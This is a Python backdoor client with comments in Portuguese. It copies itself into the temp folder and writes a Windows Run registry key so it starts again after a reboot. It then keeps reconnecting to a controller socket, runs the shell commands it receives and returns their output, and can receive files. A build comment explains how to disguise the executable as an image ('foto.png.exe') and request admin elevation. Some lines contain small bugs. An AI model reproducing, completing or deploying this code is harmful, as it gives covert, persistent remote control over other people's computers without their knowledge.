#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

# código do cliente
# se cair -> reconecta
# ao reiniciar o pc -> reconecta


import socket
import os
import time
import subprocess
import tempfile

nome_arquivo='backdoor.exe'
TEMPDIR = tempfile.gettempdir()

'''
 pyinstaller -F --clean -w backdoor.py -i icone.png -n foto.png.exe
 testar ->
--uac-admin           Using this option creates a Manifest which will
                        request elevation upon application restart.
  --uac-uiaccess        Using this option allows an elevated application to
                        work with Remote Desktop.


    Mkdir touch >
    Print stderr + stdout no lado do cliente para que no lado do servidor não trave .
'''

def persistencia():
    if(not os.getcwd() == TEMPDIR):
        subprocess.Popen('copy ' + nome_arquivo + ' ' + TEMPDIR, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
        FNULL = open(os.devnull,'w')
        subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + TEMPDIR + "\\" + nome_arquivo, stdout=FNULL, sderr=FNULL)

def conecta(IP, PORT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send('[+] Conectado :)')
        return s
    except socket.error as erro:
        return None

def executa(socket):
    while True:
        try:
            dados = socket.recv(1024)
            if(not dados): # servidor desconectou, recomeça
                return
            else:
                print(dados)
                try:
                    if(dados=='upload'): # upload
                        print('recebendo arquivo')
                        nome_arquivo = socket.recv(1024)
                        f = open(nome_arquivo,'wb')
                        l = socket.recv(512)
                        while (l):
                            f.write(l)
                            l = sc.recv(512)

                    elif(dados=='shell'): # shell
                        while True:
                            dados = socket.recv(1024)
                            if(not dados or dados=='exit'):
                                break
                            if(dados == 'shell'):
                                pass
                            else:
                                if(dados.split(' ')[0] == 'cd'):
                                    try:
                                        pasta = (dados.split(' ')[1])
                                        caminho = os.chdir(pasta.rstrip('\n'))
                                        local = os.getcwd()
                                        socket.send(local)
                                    except Exception as e:
                                        socket.send('Erro a trocar de diretorio -> ' + e)

                                else:
                                    comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
                                    retorno = comando.stdout.read() + comando.stderr.read()
                                    print('enviando',retorno)
                                    socket.send(retorno)

                    elif(dados=='download'):
                        pass
                except:
                    return
        except: # algum erro ocorreu, recomeça
            return

def main():
    ip='127.0.0.1'
    porta=1025
    while True:
        conexao = conecta(ip, porta)
        if(conexao):
            executa(conexao)
        else:
            time.sleep(5)

if __name__=='__main__':
    if(not os.name == 'posix'):
        persistencia()
    main()
